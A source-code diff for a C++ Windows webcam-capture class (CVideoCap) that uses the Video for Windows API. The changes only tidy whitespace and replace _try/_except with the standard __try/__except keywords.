@@ -20,7 +20,7 @@ CVideoCap::CVideoCap()
 	m_hWnd = CreateWindow(_T("#32770"), _T(""), WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
 	m_hWndCap = capCreateCaptureWindow
 		(
-		_T("CVideoCap"), 
+		_T("CVideoCap"),
 		WS_CHILD | WS_VISIBLE,
 		0,
 		0,
@@ -58,7 +58,7 @@ LRESULT CALLBACK CVideoCap::capErrorCallback(HWND hWnd,	int nID, LPCTSTR lpsz)
 
 LRESULT CALLBACK CVideoCap::FrameCallbackProc(HWND hWnd, LPVIDEOHDR lpVHdr)
 {
-	_try
+	__try
 	{
 		CVideoCap *pThis = (CVideoCap *)capGetUserData(hWnd);
 		if (pThis != NULL)
@@ -68,7 +68,7 @@ LRESULT CALLBACK CVideoCap::FrameCallbackProc(HWND hWnd, LPVIDEOHDR lpVHdr)
 //			pThis->m_bIsCapture = false;
 		}
 	}
-	_except(1)
+	__except(1)
 	{
 		return 0;
 	}
@@ -83,7 +83,7 @@ BOOL CVideoCap::IsWebCam()
 		return FALSE;
 
 	BOOL  bRet = FALSE;
-	
+
 	TCHAR lpszName[100], lpszVer[50];
 	for (int i = 0; i < 10 && !bRet; i++)
 	{
@@ -120,8 +120,8 @@ bool CVideoCap::Initialize()
 	}
 	if (i == 10)
 		return false;
-	
-	
+
+
 	dwSize = capGetVideoFormatSize(m_hWndCap);
 	capSetUserData(m_hWndCap, this);
 
@@ -131,15 +131,15 @@ bool CVideoCap::Initialize()
 		return false;
 	}
 	m_lpbmi = (BITMAPINFO *) new BYTE[dwSize];
-	
+
 	capGetVideoFormat(m_hWndCap, m_lpbmi, dwSize);
 	m_lpDIB = (LPVOID) new BYTE[m_lpbmi->bmiHeader.biSizeImage];
 
 	capDriverGetCaps(m_hWndCap, &gCapDriverCaps, sizeof(CAPDRIVERCAPS));
-	
+
 
 	capOverlay(m_hWndCap, FALSE);
-	capPreview(m_hWndCap, TRUE); // 选择preview方式占用固定的cpu时间	
+	capPreview(m_hWndCap, TRUE); // 选择preview方式占用固定的cpu时间
 	capPreviewScale(m_hWndCap, FALSE);
 
 	m_bIsConnected = true;
